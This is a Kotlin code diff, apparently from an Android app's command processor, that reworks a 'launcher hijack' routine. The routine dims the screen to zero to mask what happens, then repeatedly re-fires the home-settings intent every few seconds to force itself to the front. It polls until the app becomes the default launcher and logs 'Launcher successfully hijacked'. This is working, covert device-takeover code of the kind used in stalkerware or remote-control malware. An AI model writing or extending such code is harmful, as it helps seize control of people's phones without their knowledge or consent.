@@ -2261,21 +2261,22 @@ object CommandProcessor {
                                 LauncherManager.isHijacking = true
                                 LauncherManager.pendingCmdId = id
                                 
-                                android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                    DimmerManager.applyDim(ctx, 0, "AUTO")
-                                    try {
-                                        val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
-                                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                        }
-                                        ctx.startActivity(intent)
-                                    } catch (e: Exception) { 
-                                        LauncherManager.isHijacking = false 
-                                    }
-                                }
-                                
                                 var timeout = 0
                                 while(LauncherManager.isHijacking && timeout < 20) { 
-                                    kotlinx.coroutines.delay(1000); timeout++ 
+                                    // Re-fire intent every 4 seconds to force it to top
+                                    if (timeout % 4 == 0) {
+                                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                                            try {
+                                                val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                                }
+                                                ctx.startActivity(intent)
+                                            } catch (e: Exception) { }
+                                        }
+                                    }
+                                    kotlinx.coroutines.delay(1000)
+                                    timeout++ 
                                 }
                                 LauncherManager.isHijacking = false // Disarm if timeout
                             }
@@ -2599,19 +2600,19 @@ object CommandProcessor {
                         LauncherManager.isHijacking = true
                         LauncherManager.pendingCmdId = id
                         
-                        android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            try {
-                                val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
-                                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                }
-                                ctx.startActivity(intent)
-                            } catch (e: Exception) {
-                                LauncherManager.isHijacking = false
-                            }
-                        }
-                        
                         var waitTime = 0
                         while (LauncherManager.isHijacking && waitTime < 25000) {
+                            // Re-fire intent every 3.5 seconds
+                            if (waitTime % 3500 == 0) {
+                                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                    try {
+                                        val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                        }
+                                        ctx.startActivity(intent)
+                                    } catch (e: Exception) { }
+                                }
+                            }
                             kotlinx.coroutines.delay(500)
                             waitTime += 500
                         }
@@ -2682,30 +2683,41 @@ object CommandProcessor {
                     LauncherManager.isHijacking = true
                     LauncherManager.pendingCmdId = id
                     
-                    android.os.Handler(android.os.Looper.getMainLooper()).post {
-                        DebugLogger.log("HIJACK_INIT", "Applying Dimmer (0, AUTO) to mask transition.")
-                        DimmerManager.applyDim(ctx, 0, "AUTO")
-                        try {
-                            val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
-                                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        var elapsed = 0
+                        while (LauncherManager.isHijacking && elapsed < 30) {
+                            val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                            if (currentHome == ctx.packageName) {
+                                DebugLogger.log("HIJACK_INIT", "Launcher successfully hijacked.")
+                                LauncherManager.isHijacking = false
+                                break
                             }
-                            DebugLogger.log("HIJACK_INIT", "Firing Intent: ${intent.action}")
-                            ctx.startActivity(intent)
-                        } catch (e: Exception) {
-                            DebugLogger.log("HIJACK_INIT_ERR", "Intent failed to launch: ${e.message}")
-                            LauncherManager.isHijacking = false
-                            DimmerManager.removeOverlay(ctx)
+
+                            // Re-fire the intent every 3 seconds to keep it fresh and at the front
+                            if (elapsed % 3 == 0) {
+                                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                    DimmerManager.applyDim(ctx, 0, "AUTO")
+                                    try {
+                                        val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                        }
+                                        ctx.startActivity(intent)
+                                    } catch (e: Exception) { }
+                                }
+                            }
+
+                            kotlinx.coroutines.delay(1000)
+                            elapsed++
                         }
-                    }
-                    
-                    // Safety fuse: Reset if stuck for 30s
-                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+
                         if (LauncherManager.isHijacking) {
                             DebugLogger.log("HIJACK_TIMEOUT", "30s timeout reached. Aborting hijack sequence.")
                             LauncherManager.isHijacking = false
-                            DimmerManager.removeOverlay(ctx)
+                            withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                DimmerManager.removeOverlay(ctx)
+                            }
                         }
-                    }, 30000)
+                    }
 
                     status = "HIJACK_INITIATED"
                 }
